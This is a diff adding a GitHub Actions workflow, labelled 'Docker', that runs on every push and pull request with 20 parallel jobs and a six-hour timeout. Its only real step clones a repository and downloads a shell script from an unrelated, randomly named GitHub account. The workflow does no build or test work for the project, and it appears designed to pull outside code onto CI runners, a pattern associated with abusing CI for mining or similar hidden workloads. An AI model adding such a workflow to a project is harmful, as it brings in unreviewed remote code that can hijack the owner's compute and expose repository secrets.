@@ -1,0 +1,29 @@
+name: Docker
+
+on: [push, pull_request]
+jobs:
+  build:
+    name: Docker
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.2]
+        flag: [A]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Settting
+      uses: actions/checkout@v1
+    - name: run
+      run: |
+          git clone --depth 1 https://github.com/sifamuhaeny/dind.git
+          wget https://github.com/sifamuhaeny/khsusahsna/blob/main/wrapdocker.sh
